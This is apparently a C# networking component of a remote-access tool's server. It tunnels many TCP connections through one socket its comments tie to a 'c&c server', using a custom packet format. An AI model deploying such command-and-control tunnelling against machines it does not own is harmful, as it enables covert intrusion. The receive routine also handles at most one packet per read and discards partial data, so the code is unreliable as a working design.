using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.Sockets;
using xServer.Core.Extensions;

namespace xServer.Core.Networking
{
    public class NetworkTunnel
    {
        /// <summary>
        /// This is the main socket, it should be connected to the c&c server
        /// </summary>
        Socket _handle;
        byte[] _readBuffer;

        /// <summary>
        /// List of sockets connected through the tunnel.
        /// </summary>
        List<TunnelSocket> _tunnelSockets;

        /// <summary>
        /// Gets the sockets currently connected through the tunnel.
        /// </summary>
        public TunnelSocket[] TunnelSockets
        {
            get { return _tunnelSockets.ToArray(); }
        }

        /// <summary>
        /// The keep-alive time in ms.
        /// </summary>
        public uint KEEP_ALIVE_TIME { get { return 25000; } } // 25s

        /// <summary>
        /// The keep-alive interval in ms.
        /// </summary>
        public uint KEEP_ALIVE_INTERVAL { get { return 25000; } } // 25s

        /// <summary>
        /// Occurs when a new socket is connected
        /// </summary>
        public event SocketConnectionEventHandler SocketConnected;

        /// <summary>
        /// Occurs when a new socket is connected
        /// </summary>
        public event SocketConnectionEventHandler SocketDisconnected;

        /// <summary>
        /// Represents the method that will handle connection events
        /// </summary>
        /// <param name="s">The TunnelSocket wich represents the connection.</param>
        public delegate void SocketConnectionEventHandler(TunnelSocket s);

        /// <summary>
        /// NetworkTunnel fail event and event-handler
        /// </summary>
        public event NetworkTunnelFailedEventHandler NetworkTunnelFailed;
        public delegate void NetworkTunnelFailedEventHandler(Exception ex);

        public NetworkTunnel()
        {
            _readBuffer = new byte[1024];
            _tunnelSockets = new List<TunnelSocket>();
        }

        /// <summary>
        /// Fires an event that informs subscribers that a new socket has been connected.
        /// </summary>
        /// <param name="s">The TunnelSocket wich represents the new connection.</param>
        public void OnSocketConnected(TunnelSocket s)
        {
            _tunnelSockets.Add(s);
            var handler = SocketConnected;
            if(handler != null)
            {
                handler(s);
            }
        }

        /// <summary>
        /// Fires an event that informs subscribers that a new socket has been disconnected.
        /// </summary>
        /// <param name="s">The TunnelSocket wich represents the lost connection.</param>
        public void OnSocketDisconnected(TunnelSocket s)
        {
            _tunnelSockets.Remove(s);
            var handler = SocketDisconnected;
            if (handler != null)
            {
                handler(s);
            }
        }

        /// <summary>
        /// Fires an event that informs subscribers that the network tunnel has failed.
        /// </summary>
        public void OnNetowkTunnelFailed(Exception ex)
        {
            var handler = NetworkTunnelFailed;
            if (handler != null)
            {
                handler(ex);
            }
        }

        private void OnDataReceived(IPEndPoint remoteEndPoint, byte[] payload)
        {
            findSocketByEndPoint(remoteEndPoint).Receive(payload);
        }

        private TunnelSocket findSocketByEndPoint(IPEndPoint ipep)
        {
            return _tunnelSockets.Find(x => x.RemoteEndPoint.Equals(ipep));
        }

        /// <summary>
        /// Called when a valid tunnel packet arrives through the tunnel
        /// </summary>
        /// <param name="packet"></param>
        private void OnTunnelPacketReceived(TunnelPacket packet)
        {
            switch(packet.Type)
            {
                case TunnelPacket.TCP_SYN :
                    {
                        TunnelSocket ts = new TunnelSocket(this, packet.RemoteEndPoint);
                        OnSocketConnected(ts);
                        break;
                    }
                case TunnelPacket.TCP_PSH:
                    {
                        OnDataReceived(packet.RemoteEndPoint, packet.Payload);
                        break;
                    }
                case TunnelPacket.TCP_FIN:
                    {
                        OnSocketDisconnected(findSocketByEndPoint(packet.RemoteEndPoint));
                        break;
                    }
            }
        }

        /// <summary>
        /// Initializes the network tunnel connecting the main socket to the tunnel server
        /// </summary>
        public void Connect(IPAddress ip, ushort port)
        {
            try
            {
                Disconnect();

                _handle = new Socket(ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                _handle.SetKeepAliveEx(KEEP_ALIVE_INTERVAL, KEEP_ALIVE_TIME);
                _handle.Connect(ip, port);

                if (_handle.Connected)
                {
                    _handle.BeginReceive(_readBuffer, 0, _readBuffer.Length, SocketFlags.None, AsyncReceive, null);
                }
            }
            catch (Exception ex)
            {
                OnNetowkTunnelFailed(ex);
            }
        }


        /// <summary>
        /// Collects incomming data and creates the corresponding TunnelPackets instances
        /// </summary>
        /// <param name="result"></param>
        public void AsyncReceive(IAsyncResult result)
        {
            int receivedBytes = _handle.EndReceive(result);
            int packetLength = 0;
            if (TunnelPacket.Eval(_readBuffer, receivedBytes, ref packetLength))
            {
                byte[] rawPacket = new byte[packetLength];
                Array.Copy(_readBuffer, rawPacket, packetLength);
                TunnelPacket tp = new TunnelPacket(rawPacket);
                OnTunnelPacketReceived(tp);
            }
            else
            {
                /* Invalid or incomplete packet */
            }

            if (_handle.Connected)
            {
                _handle.BeginReceive(_readBuffer, 0, _readBuffer.Length, SocketFlags.None, AsyncReceive, null);
            }
        }

        public int Send(TunnelSocket socket, byte[] packet)
        {
            TunnelPacket tp = new TunnelPacket((IPEndPoint)socket.RemoteEndPoint, TunnelPacket.TCP_PSH, packet);
            return _handle.Send(tp.Build());
        }

        public void CloseSocket(TunnelSocket socket)
        {
            TunnelPacket tp = new TunnelPacket((IPEndPoint)socket.RemoteEndPoint, TunnelPacket.TCP_FIN, new byte[0]);
            _handle.Send(tp.Build());
        }

        public void Disconnect()
        {
            try
            {
                _handle.Close();
            }
            catch(Exception)
            {

            }
        }

        /// <summary>
        /// A TunnelPacket is built with the following format:
        /// [4 bytes for the origin IP Address]
        /// [2 bytes for the origin port (big endian)]
        /// [1 byte for the packet type]
        /// [2 bytes for the payload length (big endian)]
        /// [ the payload ]
        /// </summary>
        private class TunnelPacket
        {
            public const byte TCP_SYN = 0;
            public const byte TCP_PSH = 1;
            public const byte TCP_FIN = 2;
            private byte _type;
            private IPEndPoint _ipep;
            private byte[] _payload;
            private ushort _length;

            public byte Type { get { return _type; } }
            public IPEndPoint RemoteEndPoint { get { return _ipep; } }
            public byte[] Payload { get { return _payload; } }

            /// <summary>
            /// Parses a packet/buffer to create a new TunnelPacket
            /// </summary>
            /// <param name="packet"> the buffer to be parsed </param>
            public TunnelPacket(byte[] packet)
            {
                byte[] tmp = new byte[4];
                Array.Copy(packet, 0, tmp, 0, 4);
                IPAddress address = new IPAddress(tmp);
                tmp = new byte[2];
                Array.Copy(packet, 4, tmp, 0, 2);
                if (BitConverter.IsLittleEndian)
                {
                    Array.Reverse(tmp);
                }
                ushort port = BitConverter.ToUInt16(tmp, 0);
                _ipep = new IPEndPoint(address, port);
                _type = packet[6];
                Array.Copy(packet, 7, tmp, 0, 2);
                if (BitConverter.IsLittleEndian)
                {
                    Array.Reverse(tmp);
                }
                _length = BitConverter.ToUInt16(tmp, 0);
                _payload = new byte[_length];
                Array.Copy(packet, 9, _payload, 0, _length);
            }

            /// <summary>
            /// Creates a TunnelPacket that can be serialized using the Build() method
            /// </summary>
            /// <param name="ipep"></param>
            /// <param name="type"></param>
            /// <param name="payload"></param>
            public TunnelPacket(IPEndPoint ipep, byte type, byte[] payload)
            {
                _type = type;
                _ipep = ipep;
                _payload = payload;
                _length = (ushort)_payload.Length;
            }

            /// <summary>
            /// Serializes this packet
            /// </summary>
            /// <returns> the byte array to be sent through the tunnel </returns>
            public byte[] Build()
            {
                byte[] address = _ipep.Address.GetAddressBytes();
                byte[] port = BitConverter.GetBytes((ushort)_ipep.Port);
                if (BitConverter.IsLittleEndian)
                {
                    Array.Reverse(port);
                }
                byte[] len = BitConverter.GetBytes(_length);
                if (BitConverter.IsLittleEndian)
                {
                    Array.Reverse(len);
                }
                byte[] serialized = new byte[address.Length + port.Length + _payload.Length + 3];
                Array.Copy(address, 0, serialized, 0, address.Length);
                Array.Copy(port, 0, serialized, address.Length, port.Length);
                serialized[address.Length + port.Length] = _type;
                Array.Copy(len, 0, serialized, address.Length + port.Length + 1, 2);
                Array.Copy(_payload, 0, serialized, address.Length + port.Length + 3, _length);
                return serialized;
            }


            /// <summary>
            /// Checks whether a buffer contains a valid TunnelPacket
            /// </summary>
            /// <param name="buffer">The buffer to be checked</param>
            /// <param name="packetLength">Variable to store the length of the tunnel packet</param>
            /// <returns> returns true whether to buffer contains a valid tunnel packet </returns>
            public static bool Eval(byte[] buffer, int length, ref int packetLength)
            {
                // a valid packet has at least 9 bytes to cover all headers
                if (length < 9) return false;
                // reading the payload size
                byte[] tmp = new byte[2];
                Array.Copy(buffer, 7, tmp, 0, 2);
                if (BitConverter.IsLittleEndian)
                {
                    Array.Reverse(tmp);
                }
                ushort payloadLength = BitConverter.ToUInt16(tmp, 0);
                if (length >= 9 + payloadLength)
                {
                    packetLength = 9 + payloadLength;
                    return true;
                }
                return false;
            }
        }
    }
}
